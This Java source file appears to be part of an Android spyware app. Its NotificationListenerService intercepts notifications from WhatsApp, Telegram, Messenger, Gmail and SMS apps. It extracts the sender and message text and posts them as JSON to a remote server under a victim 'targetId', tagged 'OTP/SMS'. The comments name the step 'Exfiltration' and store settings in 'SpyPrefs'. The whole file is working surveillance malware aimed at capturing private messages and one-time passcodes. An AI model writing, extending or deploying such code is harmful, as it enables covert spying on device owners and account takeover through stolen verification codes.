package com.nullx.pp;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.app.Notification;
import android.os.Bundle;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * NotificationService: Deep Interceptor & Stream Engine v2.7.0
 * MERGED: Legacy Notification Logic + Live Stream Support.
 */
public class NotificationService extends NotificationListenerService {

    private static final String TAG = "Core";
    private final ExecutorService executor = Executors.newSingleThreadExecutor();

    private String getServerUrl() {
        // Baca dari FlutterSharedPreferences dulu (disimpan oleh Flutter)
        SharedPreferences flutterPrefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE);
        String url = flutterPrefs.getString("flutter.server_url", null);
        if (url != null && !url.isEmpty()) return url + "/api/post-notification/";
        // Fallback ke SpyPrefs
        SharedPreferences spyPrefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
        return spyPrefs.getString("server_url", "http://127.0.0.1:3000") + "/api/post-notification/";
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String packageName = sbn.getPackageName();
            Notification notification = sbn.getNotification();
            Bundle extras = notification.extras;
            
            if (extras == null) return;

            // 1. Identifikasi Aplikasi
            String appName = getFriendlyAppName(packageName);

            // 2. Ekstraksi Judul (Legacy Object Mapping)
            String title = "New Message";
            Object titleObj = extras.get("android.title");
            if (titleObj != null) title = titleObj.toString();

            // 3. Deep Extraction Isi Pesan (Anti-Unknown Logic)
            String body = "";
            Object textObj = extras.get("android.text"); 
            if (textObj != null) body = textObj.toString();

            // Support Chat Grup (WA/Tele)
            if (body.isEmpty() || body.equalsIgnoreCase("null")) {
                CharSequence[] lines = extras.getCharSequenceArray("android.textLines");
                if (lines != null && lines.length > 0) {
                    body = lines[lines.length - 1].toString();
                }
            }

            // Support Pesan Panjang / Gmail
            if (body.isEmpty() || body.equalsIgnoreCase("null")) {
                Object bigTextObj = extras.get("android.bigText");
                if (bigTextObj != null) body = bigTextObj.toString();
            }

            // 4. Exfiltration ke Server
            if (isTargetApp(packageName) && !body.isEmpty() && !body.equalsIgnoreCase("null")) {
                SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                String targetId = prefs.getString("targetId", "UNKNOWN_DEVICE");

                relayNotification(targetId, appName, title, body, packageName);
            }
        } catch (Exception e) {
            Log.e(TAG, "Parsing Error: " + e.getMessage());
        }
    }

    private String getFriendlyAppName(String pkg) {
        PackageManager pm = getApplicationContext().getPackageManager();
        try {
            return pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString();
        } catch (Exception e) {
            return pkg.contains(".") ? pkg.substring(pkg.lastIndexOf(".") + 1).toUpperCase() : pkg;
        }
    }

    private boolean isTargetApp(String pkg) {
        return pkg.contains("whatsapp") || 
               pkg.contains("messenger") || 
               pkg.contains("telegram") || 
               pkg.contains("android.gm") || 
               pkg.contains("messaging") ||
               pkg.contains("mms");
    }

    private void relayNotification(String targetId, String appName, String sender, String message, String pkg) {
        executor.execute(() -> {
            HttpURLConnection conn = null;
            try {
                URL url = new URL(getServerUrl() + targetId);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json; utf-8");
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("targetId", targetId);
                json.put("app", appName);
                json.put("title", sender);
                json.put("body", message);
                json.put("package", pkg);
                json.put("category", "OTP/SMS"); // Tag kategori untuk filter server
                json.put("timestamp", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US).format(new java.util.Date()));

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("utf-8"));
                }
                
                if (conn.getResponseCode() == 200) {
                    Log.d(TAG, "[+] SUCCESS: Data Relayed -> " + appName);
                }
            } catch (Exception e) {
                Log.e(TAG, "Relay Failed: " + e.getMessage());
            } finally {
                if (conn != null) conn.disconnect();
            }
        });
    }

    @Override
    public void onDestroy() {
        executor.shutdown();
        super.onDestroy();
    }
}